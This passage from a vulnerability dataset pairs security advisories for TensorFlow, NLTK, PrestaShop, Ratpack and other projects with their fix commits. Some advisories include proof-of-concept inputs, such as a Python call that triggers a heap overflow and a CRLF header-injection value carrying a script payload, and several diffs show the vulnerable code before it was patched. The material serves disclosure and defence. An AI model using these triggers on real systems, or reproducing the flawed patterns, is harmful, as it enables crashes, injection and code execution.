Compute(OpKernelContext* ctx) override {\\n     const Tensor& input = ctx->input(0);\\n+    OP_REQUIRES(\\n+        ctx, axis_ >= -1,\\n+        errors::InvalidArgument(\"Axis must be at least -1. Found \", axis_));\\n     OP_REQUIRES(\\n         ctx, (axis_ == -1 || axis_ < input.shape().dims()),\\n         errors::InvalidArgument(\"Shape must be at least rank \", axis_ + 1,'}}","message_norm":"fix the check failure in tf.raw_ops.quantizeanddequantizev2.\n\npiperorigin-revid: 371361603\nchange-id: ia70e34d41adaadddf928e95e5e5c5c97d5bc60d0","language":"en","entities":"[('fix', 'ACTION', ''), ('371361603', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc'])","num_files":1.0},{"index":2453,"vuln_id":"GHSA-mq5p-2mcr-m52j","cwe_id":"{'CWE-94'}","score":0.0,"chain":"{'https:\/\/github.com\/jupyterhub\/nbgitpuller\/commit\/07690644f29a566011dd0d7ba14cae3eb0490481'}","dataset":"osv","summary":"Code injection in nbgitpuller ### Impact\n\nDue to an unsanitized input, visiting maliciously crafted links could result in arbitrary code execution in the user environment.\n\n### Patches\n\n0.10.2\n\n### Workarounds\n\nNone, other than upgrade to 0.10.2 or downgrade to 0.8.x.\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [nbgitpuller](https:\/\/github.com\/jupyterhub\/nbgitpuller\/issues)\n* Email our security team at [security@ipython.org](mailto:security@ipython.org)","published_date":"2021-08-30","chain_len":1,"project":"https:\/\/github.com\/jupyterhub\/nbgitpuller","commit_href":"https:\/\/github.com\/jupyterhub\/nbgitpuller\/commit\/07690644f29a566011dd0d7ba14cae3eb0490481","commit_sha":"07690644f29a566011dd0d7ba14cae3eb0490481","patch":"SINGLE","chain_ord":"['07690644f29a566011dd0d7ba14cae3eb0490481']","before_first_fix_commit":"{'f25d3f2685035c11bd668d48e71caf4fc245ba68', '2cad6147f1769a962f8d0733045967663add53cb'}","last_fix_commit":"07690644f29a566011dd0d7ba14cae3eb0490481","chain_ord_pos":1.0,"commit_datetime":"08\/25\/2021, 12:23:02","message":"Merge pull request from GHSA-mq5p-2mcr-m52j\n\nmake positional args explicit","author":"Erik Sundell","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'nbgitpuller\/pull.py': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyterhub\/nbgitpuller\/raw\/07690644f29a566011dd0d7ba14cae3eb0490481\/nbgitpuller%2Fpull.py', 'patch': '@@ -88,13 +88,13 @@ def branch_exists(self, branch):\\n         \"\"\"\\n         try:\\n             heads = subprocess.run(\\n-                [\"git\", \"ls-remote\", \"--heads\", self.git_url],\\n+                [\"git\", \"ls-remote\", \"--heads\", \"--\", self.git_url],\\n                 capture_output=True,\\n                 text=True,\\n                 check=True\\n             )\\n             tags = subprocess.run(\\n-                [\"git\", \"ls-remote\", \"--tags\", self.git_url],\\n+                [\"git\", \"ls-remote\", \"--tags\", \"--\", self.git_url],\\n                 capture_output=True,\\n                 text=True,\\n                 check=True\\n@@ -118,7 +118,7 @@ def resolve_default_branch(self):\\n         \"\"\"\\n         try:\\n             head_branch = subprocess.run(\\n-                [\"git\", \"ls-remote\", \"--symref\", self.git_url, \"HEAD\"],\\n+                [\"git\", \"ls-remote\", \"--symref\", \"--\", self.git_url, \"HEAD\"],\\n                 capture_output=True,\\n                 text=True,\\n                 check=True\\n@@ -154,7 +154,7 @@ def initialize_repo(self):\\n         if self.depth and self.depth > 0:\\n             clone_args.extend([\\'--depth\\', str(self.depth)])\\n         clone_args.extend([\\'--branch\\', self.branch_name])\\n-        clone_args.extend([self.git_url, self.repo_dir])\\n+        clone_args.extend([\"--\", self.git_url, self.repo_dir])\\n         yield from execute_cmd(clone_args)\\n         logging.info(\\'Repo {} initialized\\'.format(self.repo_dir))'}}","message_norm":"merge pull request from ghsa-mq5p-2mcr-m52j\n\nmake positional args explicit","language":"ca","entities":"[('ghsa-mq5p-2mcr-m52j', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['nbgitpuller\/pull.py'])","num_files":1.0},{"index":2457,"vuln_id":"GHSA-mqh2-9wrp-vx84","cwe_id":"{'CWE-787'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31'}","dataset":"osv","summary":"Heap buffer overflow in `SparseSplit` ### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.SparseSplit`:\n\n```python\nimport tensorflow as tf\n\nshape_dims = tf.constant(0, dtype=tf.int64)\nindices = tf.ones([1, 1], dtype=tf.int64)\nvalues = tf.ones([1], dtype=tf.int64)\nshape = tf.ones([1], dtype=tf.int64)\n\ntf.raw_ops.SparseSplit(\n    split_dim=shape_dims, indices=indices, values=values,\n    shape=shape, num_split=1)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/699bff5d961f0abfde8fa3f876e6d241681fbef8\/tensorflow\/core\/util\/sparse\/sparse_tensor.h#L528-L530) accesses an array element based on a user controlled offset:\n\n```cc\nconst int dim = input_tensor.indices().matrix<int64>()(i, split_dim);\nint slice_index = GetSliceIndex(dim, split_size, residual);\nnum_values[slice_index]++;\n```\n\nThis results in overriding values on the heap.\n\n### Patches\nWe have patched the issue in GitHub commit [8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31","commit_sha":"8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31","patch":"SINGLE","chain_ord":"['8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31']","before_first_fix_commit":"{'699bff5d961f0abfde8fa3f876e6d241681fbef8'}","last_fix_commit":"8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31","chain_ord_pos":1.0,"commit_datetime":"04\/30\/2021, 00:58:08","message":"Fix heap-buffer-overflow issue with `tf.raw_ops.SparseSplit`.\n\nPiperOrigin-RevId: 371242872\nChange-Id: I482bb3d12602c7c3cc9446f97fb9f584bb98e9a4","author":"Amit Patankar","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/util\/sparse\/sparse_tensor.h': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31\/tensorflow%2Fcore%2Futil%2Fsparse%2Fsparse_tensor.h', 'patch': '@@ -527,6 +527,10 @@ inline Status SparseTensor::Split(const SparseTensor& input_tensor,\\n   for (int i = 0; i < input_tensor.indices().dim_size(0); ++i) {\\n     const int dim = input_tensor.indices().matrix<int64>()(i, split_dim);\\n     int slice_index = GetSliceIndex(dim, split_size, residual);\\n+    if (slice_index >= num_values.size()) {\\n+      return errors::InvalidArgument(\"Slice index \", slice_index,\\n+                                     \" is larger than num_split.\");\\n+    }\\n     num_values[slice_index]++;\\n   }'}}","message_norm":"fix heap-buffer-overflow issue with `tf.raw_ops.sparsesplit`.\n\npiperorigin-revid: 371242872\nchange-id: i482bb3d12602c7c3cc9446f97fb9f584bb98e9a4","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('371242872', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/util\/sparse\/sparse_tensor.h'])","num_files":1.0},{"index":2460,"vuln_id":"GHSA-mr6r-82x4-f4jj","cwe_id":"{'CWE-203'}","score":7.4,"chain":"{'https:\/\/github.com\/simplito\/elliptic-php\/commit\/15652609aa55968d56685c2a9120535ccdc00fd9'}","dataset":"osv","summary":"Timing attacks might allow practical recovery of the long-term private key In elliptic-php versions priot to 1.0.6, Timing attacks might be possible which can result in practical recovery of the long-term private key generated by the library under certain conditions. Leakage of a bit-length of the scalar during scalar multiplication is possible on an elliptic curve which might allow practical recovery of the long-term private key.","published_date":"2019-11-20","chain_len":1,"project":"https:\/\/github.com\/simplito\/elliptic-php","commit_href":"https:\/\/github.com\/simplito\/elliptic-php\/commit\/15652609aa55968d56685c2a9120535ccdc00fd9","commit_sha":"15652609aa55968d56685c2a9120535ccdc00fd9","patch":"SINGLE","chain_ord":"['15652609aa55968d56685c2a9120535ccdc00fd9']","before_first_fix_commit":"{'03a8dbc6514a1c8e6b00b967bca388d36ab73169'}","last_fix_commit":"15652609aa55968d56685c2a9120535ccdc00fd9","chain_ord_pos":1.0,"commit_datetime":"11\/14\/2019, 13:43:07","message":"ecdsa: Apply nonce bit-length mitigation to stop timing leakage.\n\nPorted from elliptic-js: https:\/\/github.com\/indutny\/elliptic\/pull\/203","author":"Sebastian Smyczy\u0144ski","comments":null,"stats":"{'additions': 11, 'deletions': 1, 'total': 12}","files":"{'lib\/EC.php': {'additions': 11, 'deletions': 1, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/simplito\/elliptic-php\/raw\/15652609aa55968d56685c2a9120535ccdc00fd9\/lib%2FEC.php', 'patch': \"@@ -136,7 +136,17 @@ public function sign($msg, $key, $enc = null, $options = null)\\n             if( $k->cmpn(1) <= 0 || $k->cmp($ns1) >= 0 )\\n                 continue;\\n \\n-            $kp = $this->g->mul($k);\\n+            \/\/ Fix the bit-length of the random nonce,\\n+            \/\/ so that it doesn't leak via timing.\\n+            \/\/ This does not change that ks = k mod k\\n+            $ks = $k->add($this->n);\\n+            $kt = $ks->add($this->n);\\n+            if ($ks->bitLength() === $this->n->bitLength()) {\\n+                $kp = $this->g->mul($kt);\\n+            } else {\\n+                $kp = $this->g->mul($ks);\\n+            }\\n+\\n             if( $kp->isInfinity() )\\n                 continue;\"}}","message_norm":"ecdsa: apply nonce bit-length mitigation to stop timing leakage.\n\nported from elliptic-js: https:\/\/github.com\/indutny\/elliptic\/pull\/203","language":"en","entities":"[('ecdsa', 'SECWORD', ''), ('nonce', 'SECWORD', ''), ('timing leakage', 'SECWORD', ''), ('https:\/\/github.com\/indutny\/elliptic\/pull\/203', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/EC.php'])","num_files":1.0},{"index":2461,"vuln_id":"GHSA-mr7p-25v2-35wr","cwe_id":"{'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/nltk\/nltk\/commit\/f59d7ed8df2e0e957f7f247fe218032abdbe9a10'}","dataset":"osv","summary":"Path Traversal in nltk NLTK Downloader before 3.4.5 is vulnerable to a directory traversal, allowing attackers to write arbitrary files via a ..\/ (dot dot slash) in an NLTK package (ZIP archive) that is mishandled during extraction.","published_date":"2019-08-23","chain_len":1,"project":"https:\/\/github.com\/nltk\/nltk","commit_href":"https:\/\/github.com\/nltk\/nltk\/commit\/f59d7ed8df2e0e957f7f247fe218032abdbe9a10","commit_sha":"f59d7ed8df2e0e957f7f247fe218032abdbe9a10","patch":"SINGLE","chain_ord":"['f59d7ed8df2e0e957f7f247fe218032abdbe9a10']","before_first_fix_commit":"{'2554ff48feed878ba7e830ada9825196f3eaa86a'}","last_fix_commit":"f59d7ed8df2e0e957f7f247fe218032abdbe9a10","chain_ord_pos":1.0,"commit_datetime":"08\/20\/2019, 10:35:00","message":"CVE-2019-14751:\nFixed security bug in downloader\n(https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2019-14751)","author":"Steven Bird","comments":"{'com_1': {'author': 'greysteil', 'datetime': '08\/26\/2019, 11:01:35', 'body': \"Thanks for this @stevenbird, and for all your work on `nltk`.\\r\\n\\r\\nHave you got 5 minutes to talk me through the process you went through fixing this, and any way GitHub can help? I'm on GitHub's security team and am working to make it easier for maintainers to alert users of security vulnerabilities.\\r\\n\\r\\nCurrently we have the security alert emails (which we're working to improve) and Security Advisories (the security tab on this repo). In future we're planning to make it easy for maintainers to apply for CVEs through GitHub (via creating Security Advisories).\\r\\n\\r\\nWas there any part of the flow of finding, fixing, and alerting users of this vulnerability that GitHub could have helped with? Or anything we're doing now that you'd like us to do differently?\\r\\n\\r\\nAny feedback very much appreciated. I'm on greysteil@github.com if you'd rather email it privately.\\r\\n\\r\\nThanks for all your do, and please don't hesitate to reach out if there's ever any way GitHub can help.\"}}","stats":"{'additions': 1, 'deletions': 35, 'total': 36}","files":"{'nltk\/downloader.py': {'additions': 1, 'deletions': 35, 'changes': 36, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nltk\/nltk\/raw\/f59d7ed8df2e0e957f7f247fe218032abdbe9a10\/nltk%2Fdownloader.py', 'patch': \"@@ -2260,42 +2260,8 @@ def _unzip_iter(filename, root, verbose=True):\\n         yield ErrorMessage(filename, e)\\n         return\\n \\n-    # Get lists of directories & files\\n-    namelist = zf.namelist()\\n-    dirlist = set()\\n-    for x in namelist:\\n-        if x.endswith('\/'):\\n-            dirlist.add(x)\\n-        else:\\n-            dirlist.add(x.rsplit('\/', 1)[0] + '\/')\\n-    filelist = [x for x in namelist if not x.endswith('\/')]\\n-\\n-    # Create the target directory if it doesn't exist\\n-    if not os.path.exists(root):\\n-        os.mkdir(root)\\n-\\n-    # Create the directory structure\\n-    for dirname in sorted(dirlist):\\n-        pieces = dirname[:-1].split('\/')\\n-        for i in range(len(pieces)):\\n-            dirpath = os.path.join(root, *pieces[: i + 1])\\n-            if not os.path.exists(dirpath):\\n-                os.mkdir(dirpath)\\n-\\n-    # Extract files.\\n-    for i, filename in enumerate(filelist):\\n-        filepath = os.path.join(root, *filename.split('\/'))\\n-\\n-        try:\\n-            with open(filepath, 'wb') as dstfile, zf.open(filename) as srcfile:\\n-                shutil.copyfileobj(srcfile, dstfile)\\n-        except Exception as e:\\n-            yield ErrorMessage(filename, e)\\n-            return\\n+    zf.extractall(root)\\n \\n-        if verbose and (i * 10 \/ len(filelist) > (i - 1) * 10 \/ len(filelist)):\\n-            sys.stdout.write('.')\\n-            sys.stdout.flush()\\n     if verbose:\\n         print()\"}}","message_norm":"cve-2019-14751:\nfixed security bug in downloader\n(https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=cve-2019-14751)","language":"en","entities":"[('cve-2019-14751', 'VULNID', 'CVE'), ('fixed', 'ACTION', ''), ('security', 'SECWORD', ''), ('bug', 'FLAW', ''), ('https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=cve-2019-14751', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['nltk\/downloader.py'])","num_files":1.0},{"index":2462,"vuln_id":"GHSA-mrq4-7ch7-2465","cwe_id":"{'CWE-94'}","score":9.0,"chain":"{'https:\/\/github.com\/PrestaShop\/PrestaShop\/commit\/d02b469ec365822e6a9f017e57f588966248bf21'}","dataset":"osv","summary":"Server Side Twig Template Injection PrestaShop is an Open Source e-commerce platform. Starting with version 1.7.0.0 and ending with version 1.7.8.3, an attacker is able to inject twig code inside the back office when using the legacy layout. The problem is fixed in version 1.7.8.3. There are no known workarounds.","published_date":"2022-01-27","chain_len":1,"project":"https:\/\/github.com\/PrestaShop\/PrestaShop","commit_href":"https:\/\/github.com\/PrestaShop\/PrestaShop\/commit\/d02b469ec365822e6a9f017e57f588966248bf21","commit_sha":"d02b469ec365822e6a9f017e57f588966248bf21","patch":"SINGLE","chain_ord":"['d02b469ec365822e6a9f017e57f588966248bf21']","before_first_fix_commit":"{'ed8eb7ce8242e91d7acf85d7157277aad6bcac21', 'd2807b0560d5ca2835c6a4774e183c182d903f1a'}","last_fix_commit":"d02b469ec365822e6a9f017e57f588966248bf21","chain_ord_pos":1.0,"commit_datetime":"01\/26\/2022, 09:20:05","message":"Merge pull request from GHSA-mrq4-7ch7-2465\n\nProperly escape smarty output for twig","author":"GoT","comments":null,"stats":"{'additions': 18, 'deletions': 19, 'total': 37}","files":"{'src\/PrestaShopBundle\/Twig\/LayoutExtension.php': {'additions': 18, 'deletions': 19, 'changes': 37, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PrestaShop\/PrestaShop\/raw\/d02b469ec365822e6a9f017e57f588966248bf21\/src%2FPrestaShopBundle%2FTwig%2FLayoutExtension.php', 'patch': \"@@ -218,26 +218,25 @@ public function getLegacyLayout(\\n             throw new Exception('PrestaShopBundle\\\\Twig\\\\LayoutExtension cannot find the {$content} string in legacy layout template', 1);\\n         }\\n \\n-        $content = str_replace(\\n-            [\\n-                '{$content}',\\n-                'var currentIndex = \\\\'index.php\\\\';',\\n-                '<\/head>',\\n-                '<\/body>',\\n-            ],\\n-            [\\n-                '{% block content_header %}{% endblock %}\\n-                 {% block content %}{% endblock %}\\n-                 {% block content_footer %}{% endblock %}\\n-                 {% block sidebar_right %}{% endblock %}',\\n-                'var currentIndex = \\\\'' . $this->context->getAdminLink($controllerName) . '\\\\';',\\n-                '{% block stylesheets %}{% endblock %}{% block extra_stylesheets %}{% endblock %}<\/head>',\\n-                '{% block javascripts %}{% endblock %}{% block extra_javascripts %}{% endblock %}{% block translate_javascripts %}{% endblock %}<\/body>',\\n-            ],\\n-            $layout\\n-        );\\n+        $explodedLayout = explode('{$content}', $layout);\\n+        $header = explode('<\/head>', $explodedLayout[0]);\\n+        $footer = explode('<\/body>', $explodedLayout[1]);\\n+\\n+        return $this->escapeSmarty(str_replace('var currentIndex = \\\\'index.php\\\\';', 'var currentIndex = \\\\'' . $this->context->getAdminLink($controllerName) . '\\\\';', $header[0]))\\n+            . '{% block stylesheets %}{% endblock %}{% block extra_stylesheets %}{% endblock %}<\/head>'\\n+            . $this->escapeSmarty($header[1])\\n+            . '{% block content_header %}{% endblock %}'\\n+            . '{% block content %}{% endblock %}'\\n+            . '{% block content_footer %}{% endblock %}'\\n+            . '{% block sidebar_right %}{% endblock %}'\\n+            . $this->escapeSmarty($footer[0])\\n+            . '{% block javascripts %}{% endblock %}{% block extra_javascripts %}{% endblock %}{% block translate_javascripts %}{% endblock %}<\/body>'\\n+            . $this->escapeSmarty($footer[1]);\\n+    }\\n \\n-        return $content;\\n+    private function escapeSmarty(string $template): string\\n+    {\\n+        return '{{ \\\\'' . addslashes($template) . '\\\\' | raw }}';\\n     }\\n \\n     \/**\"}}","message_norm":"merge pull request from ghsa-mrq4-7ch7-2465\n\nproperly escape smarty output for twig","language":"en","entities":"[('ghsa-mrq4-7ch7-2465', 'VULNID', 'GHSA'), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/PrestaShopBundle\/Twig\/LayoutExtension.php'])","num_files":1.0},{"index":2463,"vuln_id":"GHSA-mrvj-7q4f-5p42","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/ezsystems\/ezpublish-kernel\/commit\/29fecd2afe86f763510f10c02f14962d028f311b'}","dataset":"osv","summary":"Cross-site scripting in eZ Platform Kernel ### Impact\nIn file upload it is possible by certain means to upload files like .html and .js. These may contain XSS exploits which will be run when links to them are accessed by victims.\n\n### Patches\nThe fix consists simply of adding common types of scriptable file types to the configuration of the already existing filetype blacklist feature. See \"Patched versions\". As such, this can also be done manually, without installing the patched versions. This may be relevant if you are currently running a considerably older version of the kernel package and don't want to upgrade it at this time. Please see the settting \"ezsettings.default.io.file_storage.file_type_blacklist\" at:\nhttps:\/\/github.com\/ezsystems\/ezplatform-kernel\/blob\/master\/eZ\/Bundle\/EzPublishCoreBundle\/Resources\/config\/default_settings.yml#L109\n\n### Important note\nYou should adapt this setting to your needs. Do not add file types to the blacklist that you actually need to be able to upload. For instance, if you need your editors to be able to upload SVG files, then don't blacklist that. Instead, you could e.g. use an approval workflow for such content.","published_date":"2021-03-19","chain_len":1,"project":"https:\/\/github.com\/ezsystems\/ezpublish-kernel","commit_href":"https:\/\/github.com\/ezsystems\/ezpublish-kernel\/commit\/29fecd2afe86f763510f10c02f14962d028f311b","commit_sha":"29fecd2afe86f763510f10c02f14962d028f311b","patch":"SINGLE","chain_ord":"['29fecd2afe86f763510f10c02f14962d028f311b']","before_first_fix_commit":"{'4a538dbfd28fecd404f11fa0816b69a5a9e93a16'}","last_fix_commit":"29fecd2afe86f763510f10c02f14962d028f311b","chain_ord_pos":1.0,"commit_datetime":"03\/17\/2021, 15:03:30","message":"Merge pull request from GHSA-mrvj-7q4f-5p42\n\nCo-authored-by: Gunnstein Lye <gunnstein.lye@ibexa.co>","author":"Gunnstein Lye","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'eZ\/Bundle\/EzPublishCoreBundle\/Resources\/config\/default_settings.yml': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ezsystems\/ezpublish-kernel\/raw\/29fecd2afe86f763510f10c02f14962d028f311b\/eZ%2FBundle%2FEzPublishCoreBundle%2FResources%2Fconfig%2Fdefault_settings.yml', 'patch': '@@ -89,6 +89,16 @@ parameters:\\n         - pht\\n         - phtml\\n         - pgif\\n+        - hta\\n+        - htm\\n+        - html\\n+        - xhtm\\n+        - xhtml\\n+        - jar\\n+        - js\\n+        - jse\\n+        - svg\\n+        - swf\\n \\n     # Content settings\\n     ezsettings.default.content.view_cache: true         # Whether to use content view cache or not (Etag\/Last-Modified based)'}}","message_norm":"merge pull request from ghsa-mrvj-7q4f-5p42\n\nco-authored-by: gunnstein lye <gunnstein.lye@ibexa.co>","language":"en","entities":"[('ghsa-mrvj-7q4f-5p42', 'VULNID', 'GHSA'), ('gunnstein.lye@ibexa.co', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['eZ\/Bundle\/EzPublishCoreBundle\/Resources\/config\/default_settings.yml'])","num_files":1.0},{"index":2467,"vuln_id":"GHSA-mv78-g7wq-mhp4","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/49847ae69a4e1a97ae7f2db5e217c77721e37948'}","dataset":"osv","summary":"Division by zero in padding computation in TFLite ### Impact\nThe TFLite computation for size of output after padding, [`ComputeOutSize`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0c9692ae7b1671c983569e5d3de5565843d500cf\/tensorflow\/lite\/kernels\/padding.h#L43-L55), does not check that the `stride` argument is not 0 before doing the division.\n\n```cc\ninline int ComputeOutSize(TfLitePadding padding, int image_size,\n                          int filter_size, int stride, int dilation_rate = 1) {\n  int effective_filter_size = (filter_size - 1) * dilation_rate + 1;\n  switch (padding) {\n    case kTfLitePaddingSame:\n      return (image_size + stride - 1) \/ stride;\n    case kTfLitePaddingValid:\n      return (image_size + stride - effective_filter_size) \/ stride;\n    default:\n      return 0;\n  }\n}\n```\n  \nUsers can craft special models such that `ComputeOutSize` is called with `stride` set to 0.\n\n### Patches\nWe have patched the issue in GitHub commit [49847ae69a4e1a97ae7f2db5e217c77721e37948](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/49847ae69a4e1a97ae7f2db5e217c77721e37948).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/49847ae69a4e1a97ae7f2db5e217c77721e37948","commit_sha":"49847ae69a4e1a97ae7f2db5e217c77721e37948","patch":"SINGLE","chain_ord":"['49847ae69a4e1a97ae7f2db5e217c77721e37948']","before_first_fix_commit":"{'b0e85b5b3859d060a42364c79fe664b07299a0e9'}","last_fix_commit":"49847ae69a4e1a97ae7f2db5e217c77721e37948","chain_ord_pos":1.0,"commit_datetime":"04\/27\/2021, 22:37:08","message":"Fix division by zero in TFLite padding.\n\nPiperOrigin-RevId: 370777494\nChange-Id: Ic1331e4a1603b9e4c8aa183012a6c8237410aa0f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/lite\/kernels\/padding.h': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/49847ae69a4e1a97ae7f2db5e217c77721e37948\/tensorflow%2Flite%2Fkernels%2Fpadding.h', 'patch': '@@ -44,6 +44,11 @@ inline int ComputePaddingWithOffset(int stride, int dilation_rate, int in_size,\\n inline int ComputeOutSize(TfLitePadding padding, int image_size,\\n                           int filter_size, int stride, int dilation_rate = 1) {\\n   int effective_filter_size = (filter_size - 1) * dilation_rate + 1;\\n+\\n+  \/\/ TODO(b\/186448822): This uses 0 since the function has no other way to\\n+  \/\/ report error case\\n+  if (stride == 0) return 0;\\n+\\n   switch (padding) {\\n     case kTfLitePaddingSame:\\n       return (image_size + stride - 1) \/ stride;'}}","message_norm":"fix division by zero in tflite padding.\n\npiperorigin-revid: 370777494\nchange-id: ic1331e4a1603b9e4c8aa183012a6c8237410aa0f","language":"en","entities":"[('fix', 'ACTION', ''), ('division by zero', 'SECWORD', ''), ('370777494', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/padding.h'])","num_files":1.0},{"index":2471,"vuln_id":"GHSA-mvqp-q37c-wf9j","cwe_id":"{'CWE-74'}","score":7.5,"chain":"{'https:\/\/github.com\/ratpack\/ratpack\/commit\/c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae', 'https:\/\/github.com\/ratpack\/ratpack\/commit\/efb910d38a96494256f36675ef0e5061097dd77d'}","dataset":"osv","summary":"Moderate severity vulnerability that affects io.ratpack:ratpack-core ## CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\n\nVersions of Ratpack 0.9.1 through and including 1.7.4 are vulnerable to [HTTP Response Splitting](https:\/\/www.owasp.org\/index.php\/HTTP_Response_Splitting), \nif untrusted and unsanitized data is used to populate the headers of an HTTP response.\nAn attacker can utilize this vulnerability to have the server issue any HTTP response they specify.\n\nIf your application uses arbitrary user input as the value of a response header it is vulnerable.\nIf your application does not use arbitrary values as response header values, it is not vulnerable.\n\nPreviously, Ratpack did not validate response header values.\nNow, adding a header value that contains the header value termination characters (CRLF) produces a runtime exception.\nSince there is no mechanism for escaping or encoding the termination characters in a String, a runtime exception is necessary.\n\nAs potentially dangerous values now cause runtime exceptions, it is a good idea to continue to validate and sanitize any user-supplied values being used as response headers.\n\nWe would like to thank [Jonathan Leitschuh](https:\/\/github.com\/JLLeitschuh) for reporting this vulnerability.\n\n### Vulnerable Example\n\nThe following example server uses a query parameter value as a response header, without validating or sanitizing it.\n```java\nRatpackServer startedServer =  RatpackServer.start(server -> {\n    server.handlers(chain -> chain.all(ctx -> {\n        \/\/ User supplied query parameter\n        String header = ctx.getRequest().getQueryParams().get(\"header\");\n        \/\/ User supplied data used to populate a header value.\n        ctx.header(\"the-header\", header)\n            .render(\"OK!\");\n    }));\n});\n```\n\nSending a request to the server with the following value for the `header` query param would allow the execution of arbitrary Javascript.\n\n```\nContent-Type: text\/html\nX-XSS-Protection: 0\n\n<script>alert(document.domain)<\/script>\n```\n\n### Impact\n\n- Cross-User Defacement\n- Cache Poisoning\n- Cross-Site Scripting\n- Page Hijacking\n\n### Patches\n\nThis vulnerability has been patched in Ratpack version 1.7.5.\n\n### Root Cause\n\nThe root cause was due to using the netty `DefaultHttpHeaders` object with verification disabled.\n\nhttps:\/\/github.com\/ratpack\/ratpack\/blob\/af1e8c8590f164d7dd84d4212886fad4ead99080\/ratpack-core\/src\/main\/java\/ratpack\/server\/internal\/NettyHandlerAdapter.java#L159\n\nThis vulnerability is now more clearly documented in the Netty documentation: https:\/\/github.com\/netty\/netty\/pull\/9646\n\n### Workarounds\n\nThe workaround for this vulnerability is to either not use arbitrary input as response header values or validate such values before being used to ensure they don't contain a carriage return and\/or line feed characters.\n\n### References\n\n - [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https:\/\/cwe.mitre.org\/data\/definitions\/113.html)\n - Fix commit: https:\/\/github.com\/ratpack\/ratpack\/commit\/efb910d38a96494256f36675ef0e5061097dd77d\n \n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [ratpack\/ratpack](https:\/\/github.com\/ratpack\/ratpack\/issues)\n* Ask in our [Slack 